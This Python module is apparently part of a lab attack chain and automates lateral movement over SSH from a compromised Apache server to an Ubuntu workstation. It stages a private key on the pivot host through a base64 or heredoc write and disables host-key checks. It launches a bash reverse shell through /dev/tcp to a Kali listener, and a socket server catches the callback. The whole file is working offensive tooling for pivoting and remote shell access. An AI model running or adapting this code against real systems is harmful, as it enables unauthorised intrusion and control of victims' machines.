import base64
import os
import shlex
import socket
import subprocess
import threading
import time
from pathlib import Path

# =============================================================================
# lateral_movement.py — Lateral Movement via SSH (Apache → Ubuntu Workstation)
# MITRE ATT&CK: T1021.004 – Remote Services: SSH
#                T1021.006 – Remote Services: Windows Remote Management
# =============================================================================

# Configuration
WORKSTATION_IP = "10.30.0.5"
WORKSTATION_USER = "john.stravidis"
WORKSTATION_PORT = 22
DEFAULT_REVERSE_PORT = 6666

# Will later be imported from config.py:
#   from config import KALI_HOST, WORKSTATION_IP, WORKSTATION_USER, etc.
KALI_HOST = "10.10.0.2"
DEFAULT_PIVOT_KEY_PATH = "/tmp/john_deploy_key"


def setup_listener(port=DEFAULT_REVERSE_PORT, timeout=20):
    """
    Start a socket listener on the given port to catch reverse shell callbacks.

    Args:
        port (int):     Port to listen on (default 6666 for lateral movement).
        timeout (int):  Seconds to wait for connection (default 20).

    Returns:
        socket: Bound listener socket ready for accept().
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] Lateral-movement listener started on port {port}...")
    server.settimeout(timeout)
    return server


def _send_shell_command(shell, command):
    shell.sendall((command + "\n").encode())
    time.sleep(0.2)


def _run_pivot_command(shell, command, timeout=8):
    marker = f"__END_{int(time.time() * 1000)}__"
    wrapped = f"{command}; echo {marker}"
    _send_shell_command(shell, wrapped)

    response = ""
    deadline = time.time() + timeout
    prev_timeout = shell.gettimeout()
    shell.settimeout(0.5)

    try:
        while time.time() < deadline:
            try:
                chunk = shell.recv(4096).decode(errors="replace")
            except socket.timeout:
                continue
            if not chunk:
                continue
            response += chunk
            if marker in response:
                break
    finally:
        shell.settimeout(prev_timeout)

    if marker in response:
        return response.split(marker)[0]
    return response


def _extract_uid_line(output):
    for line in output.splitlines():
        if "uid=" in line:
            return line.strip()
    return ""


def _build_ssh_command_string(key_path, user, host, port, remote_cmd, ssh_bin="ssh"):
    parts = [
        ssh_bin,
        "-i",
        key_path,
        "-o",
        "StrictHostKeyChecking=accept-new",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-o",
        "ConnectTimeout=10",
        "-o",
        "BatchMode=yes",
        "-p",
        str(port),
        f"{user}@{host}",
        remote_cmd,
    ]
    return " ".join(shlex.quote(part) for part in parts)


def _stage_key_via_pivot(shell, local_key_path, remote_key_path):
    base64_check = _run_pivot_command(
        shell, "test -x /usr/bin/base64 && echo BASE64_OK", timeout=2
    )
    if "BASE64_OK" in base64_check:
        key_b64 = base64.b64encode(Path(local_key_path).read_bytes()).decode()
        cmd = (
            f"printf %s {shlex.quote(key_b64)} | base64 -d > {shlex.quote(remote_key_path)} "
            f"&& chmod 600 {shlex.quote(remote_key_path)} "
            f"&& test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
        )
        output = _run_pivot_command(shell, cmd, timeout=6)
    else:
        key_text = Path(local_key_path).read_text()
        heredoc = (
            f"cat > {shlex.quote(remote_key_path)} <<'EOF'\n"
            f"{key_text}\n"
            "EOF\n"
            f"chmod 600 {shlex.quote(remote_key_path)}\n"
            f"test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
        )
        output = _run_pivot_command(shell, heredoc, timeout=8)

    if "KEY_OK" in output:
        return True
    trimmed = " ".join(output.split())
    if trimmed:
        print(f"[-] Key staging output: {trimmed[:200]}")
    return False


def inject_reverse_shell(
    workstation_ip,
    workstation_user,
    deploy_key_file,
    kali_host,
    kali_port,
    workstation_port=22,
):
    """
    Execute a reverse-shell payload over SSH using subprocess.

    Args:
        workstation_ip (str):   IP address of workstation.
        workstation_user (str): Username for SSH.
        deploy_key_file (str):  Path to SSH private key.
        kali_host (str):        IP address of Kali listener.
        kali_port (int):        Port of Kali listener.
        workstation_port (int): SSH port.

    Returns:
        bool: True if command was sent successfully, False otherwise.
    """
    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1'"

    print(f"[*] Injecting reverse shell to {kali_host}:{kali_port}...")

    try:
        # Build SSH command with key authentication
        ssh_cmd = [
            "ssh",
            "-i",
            deploy_key_file,
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "ConnectTimeout=10",
            "-p",
            str(workstation_port),
            f"{workstation_user}@{workstation_ip}",
            payload,
        ]

        # Non-blocking execution — reverse shell hijacks the connection
        subprocess.Popen(
            ssh_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
        return True
    except Exception as e:
        print(f"[-] Error injecting reverse shell: {e}")
        return False


def validate_ssh_key(key_file):
    """
    Validate SSH private key file exists and has appropriate permissions.

    Args:
        key_file (str): Path to the private key file.

    Returns:
        bool: True if key exists and is readable, False otherwise.
    """
    try:
        key_path = Path(key_file)
        if not key_path.exists():
            print(f"[-] Key file not found: {key_file}")
            return False

        # Check file permissions — warn if world-readable but allow for lab
        stat_info = key_path.stat()
        mode = stat_info.st_mode & 0o777
        if mode & 0o077:  # Check if group or others have any permissions
            print(f"[!] Warning: key file has loose permissions ({oct(mode)})")

        if not os.access(key_file, os.R_OK):
            print(f"[-] Key file is not readable: {key_file}")
            return False

        print(f"[+] Key file validated: {key_file}")
        return True
    except Exception as e:
        print(f"[-] Error validating key: {e}")
        return False


def verify_ssh_connection(
    workstation_ip, workstation_user, deploy_key_file, workstation_port=22
):
    """
    Execute a lightweight verification command to confirm foothold.

    Args:
        workstation_ip (str):   IP address of workstation.
        workstation_user (str): Username for SSH.
        deploy_key_file (str):  Path to SSH private key.
        workstation_port (int): SSH port.

    Returns:
        str: Command output (id output), or empty string on failure.
    """
    try:
        ssh_cmd = [
            "ssh",
            "-i",
            deploy_key_file,
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "ConnectTimeout=10",
            "-p",
            str(workstation_port),
            f"{workstation_user}@{workstation_ip}",
            "id",
        ]

        result = subprocess.run(ssh_cmd, capture_output=True, timeout=15, text=True)

        if result.returncode == 0:
            return result.stdout
        else:
            print(f"[!] SSH command returned {result.returncode}")
            if result.stderr:
                print(f"[!] stderr: {result.stderr[:100]}")
            return ""
    except subprocess.TimeoutExpired:
        print("[-] SSH verification timeout")
        return ""
    except Exception as e:
        print(f"[-] Error verifying connection: {e}")
        return ""


def verify_ssh_connection_via_pivot(
    pivot_shell,
    workstation_ip,
    workstation_user,
    key_path,
    workstation_port=22,
):
    try:
        ssh_cmd = _build_ssh_command_string(
            key_path,
            workstation_user,
            workstation_ip,
            workstation_port,
            "id",
            ssh_bin="/usr/bin/ssh",
        )
        output = _run_pivot_command(pivot_shell, ssh_cmd, timeout=12)
        uid_line = _extract_uid_line(output)
        if uid_line:
            return uid_line
        trimmed = " ".join(output.split())
        if trimmed:
            print(f"[!] Pivot SSH output: {trimmed[:200]}")
        return ""
    except Exception as e:
        print(f"[-] Error verifying connection via pivot: {e}")
        return ""


def inject_reverse_shell_via_pivot(
    pivot_shell,
    workstation_ip,
    workstation_user,
    key_path,
    kali_host,
    kali_port,
    workstation_port=22,
):
    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1'"
    ssh_cmd = _build_ssh_command_string(
        key_path,
        workstation_user,
        workstation_ip,
        workstation_port,
        payload,
        ssh_bin="/usr/bin/ssh",
    )
    fire_cmd = f"nohup {ssh_cmd} >/dev/null 2>&1 &"
    _run_pivot_command(pivot_shell, fire_cmd, timeout=2)


def run(
    deploy_key_file,
    workstation_ip=WORKSTATION_IP,
    workstation_user=WORKSTATION_USER,
    workstation_port=WORKSTATION_PORT,
    kali_host=KALI_HOST,
    kali_port=DEFAULT_REVERSE_PORT,
    pivot_shell=None,
    pivot_key_path=DEFAULT_PIVOT_KEY_PATH,
):
    """
    Execute the lateral-movement step: SSH into the workstation and establish
    both an interactive session verification and a reverse-shell fallback.

    Args:
        deploy_key_file (str):  Path to john.stravidis's Ed25519 private key.
        workstation_ip (str):   IP address of the workstation (default 10.30.0.5).
        workstation_user (str): Username to authenticate as (default john.stravidis).
        workstation_port (int): SSH port (default 22).
        kali_host (str):        IP address of Kali listener for reverse shell.
        kali_port (int):        Port of Kali listener (default 6666).

    Returns:
        dict: Status dictionary with keys:
            - 'success' (bool): Overall success.
            - 'reverse_shell' (socket): Reverse-shell socket, or None.
            - 'verification' (str): Output of 'id' command confirming foothold.
    """
    print("\n[*] Starting lateral movement to workstation...")

    result = {
        "success": False,
        "reverse_shell": None,
        "verification": "",
    }

    # Step 1: Validate the deploy key
    print(f"[*] Validating deploy key from {deploy_key_file}...")
    if not validate_ssh_key(deploy_key_file):
        print("[-] Deploy key validation failed")
        return result

    # Step 2: Prepare the reverse-shell listener
    listener_timeout = 5 if pivot_shell is not None else 20
    server_socket = setup_listener(kali_port, timeout=listener_timeout)

    # Step 3: Verify SSH connectivity with a lightweight command
    print(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
    if pivot_shell is not None:
        print("[*] Using Apache pivot shell for lateral SSH...")
        sanity = _run_pivot_command(
            pivot_shell,
            "test -x /usr/bin/ssh && echo SSH_OK || echo SSH_MISSING; "
            "test -x /usr/bin/base64 && echo BASE64_OK || echo BASE64_MISSING",
            timeout=3,
        )
        if "SSH_MISSING" in sanity:
            print("[-] Pivot shell missing /usr/bin/ssh")
        if "BASE64_MISSING" in sanity:
            print("[-] Pivot shell missing /usr/bin/base64")
        if not _stage_key_via_pivot(pivot_shell, deploy_key_file, pivot_key_path):
            print("[-] Failed to stage deploy key on Apache")
            server_socket.close()
            return result
        verification = verify_ssh_connection_via_pivot(
            pivot_shell,
            workstation_ip,
            workstation_user,
            pivot_key_path,
            workstation_port,
        )
    else:
        verification = verify_ssh_connection(
            workstation_ip, workstation_user, deploy_key_file, workstation_port
        )

    if "uid=" in verification:
        print(f"[+] SSH verification successful:")
        print(f"    {verification.strip()}")
        result["verification"] = verification.strip()
    else:
        print("[-] SSH verification failed")
        print("    → Check SSH connectivity: ssh -i <key> john.stravidis@10.30.0.5")
        print("    → Check key permissions: ls -la <key>")
        print("    → Check workstation is up: docker exec ubuntu_workstation id")
        server_socket.close()
        return result

    # Step 4: Inject reverse shell in background (best-effort)
    if pivot_shell is not None:
        inject_reverse_shell_via_pivot(
            pivot_shell,
            workstation_ip,
            workstation_user,
            pivot_key_path,
            kali_host,
            kali_port,
            workstation_port,
        )
    else:
        inject_thread = threading.Thread(
            target=inject_reverse_shell,
            args=(
                workstation_ip,
                workstation_user,
                deploy_key_file,
                kali_host,
                kali_port,
                workstation_port,
            ),
            daemon=True,
        )
        inject_thread.start()

    # Step 5: Wait for reverse-shell callback after the payload has been sent.
    try:
        reverse_shell, addr = server_socket.accept()
        print(f"[+] Reverse shell received from {addr[0]}")
        result["reverse_shell"] = reverse_shell
        print(f"[+] Lateral movement successful!")
    except socket.timeout:
        print(
            "[-] Reverse shell timeout (SSH verification succeeded, but reverse shell didn't callback)"
        )
        print(
            "    → SSH foothold is still valid; proceed with interactive SSH if needed"
        )
    finally:
        result["success"] = bool(result["verification"])
        server_socket.close()

    return result


# Test mode — not executed when imported by main.py.
# To test manually:
#   1. Copy john_deploy_key to /tmp/john_deploy_key
#   2. Start a listener: nc -lvnp 6666
#   3. Run: python lateral_movement.py /tmp/john_deploy_key <workstation_ip> <kali_ip>
if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print(
            "Usage: python lateral_movement.py <deploy_key_file> [workstation_ip] [kali_host]"
        )
        sys.exit(1)

    deploy_key = sys.argv[1]
    ws_ip = sys.argv[2] if len(sys.argv) > 2 else WORKSTATION_IP
    k_host = sys.argv[3] if len(sys.argv) > 3 else KALI_HOST

    result = run(deploy_key, workstation_ip=ws_ip, kali_host=k_host)

    print("\n[*] Result summary:")
    print(f"    Success: {result['success']}")
    print(f"    Reverse Shell: {result['reverse_shell'] is not None}")
    print(f"    Verification: {result['verification']}")
